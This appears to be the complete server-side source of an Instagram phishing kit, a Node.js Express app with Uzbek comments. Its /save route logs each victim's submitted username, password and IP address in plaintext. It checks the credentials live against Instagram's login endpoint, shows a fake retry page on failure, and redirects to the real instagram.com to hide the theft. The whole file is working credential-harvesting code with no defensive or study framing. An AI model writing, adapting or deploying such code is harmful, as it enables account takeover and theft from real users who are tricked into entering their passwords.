const express = require("express");
const fetch = require("node-fetch");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Har bir IP uchun urinishlarni saqlash
let urinishlar = {};

// Instagram tekshiruvi
async function instagramTekshir(username, password) {
    try {
        const response = await fetch("https://www.instagram.com/accounts/login/ajax/", {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded",
                "x-requested-with": "XMLHttpRequest",
                "x-ig-app-id": "936619743392459",
                "x-csrftoken": "missing",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body: new URLSearchParams({
                username: username,
                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
                queryParams: "{}",
                optIntoOneTap: "false"
            })
        });

        const data = await response.json();
        return data.authenticated === true;
    } catch (e) {
        return false;
    }
}

app.post("/save", async (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
    const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

    console.log(`TEKSHIRUV → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

    // Urinishlarni hisoblash
    if (!urinishlar[ip]) {
        urinishlar[ip] = 1;
    } else {
        urinishlar[ip]++;
    }

    // Agar 3 marta urinib ko'rgan bo'lsa, to'g'ridan Instagramga
    if (urinishlar[ip] >= 3) {
        console.log(`3 MARTA → ${ip} Instagramga yo'naltirildi`);
        delete urinishlar[ip]; // Tozalash
        res.redirect("https://www.instagram.com");
        return;
    }

    const togri = await instagramTekshir(username, password);

    if (togri) {
        console.log(`MUVOFAQ → ${username} muvaffaqiyatli kirdi`);
        delete urinishlar[ip]; // Tozalash
        res.redirect("https://www.instagram.com");
    } else {
        console.log(`XATO → ${username} paroli noto'g'ri (${urinishlar[ip]}/3 urinish)`);
        const qolgan = 3 - urinishlar[ip];
        res.send(`
            <!DOCTYPE html>
            <html>
            <head><meta charset="utf-8"><title>Xato</title></head>
            <body style="font-family:sans-serif;background:#fafafa;text-align:center;padding-top:100px;">
                <h2 style="color:#ed4956;">Login yoki parol noto'g'ri</h2>
                <p>Urinish: ${urinishlar[ip]}/3 | Qolgan: ${qolgan} ta</p>
                <p>Iltimos, qayta urinib ko'ring</p>
                <script>setTimeout(() => location.href="/", 2500);</script>
            </body>
            </html>
        `);
    }
});

const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => console.log("Instagram real tekshiruv ishlayapti"));
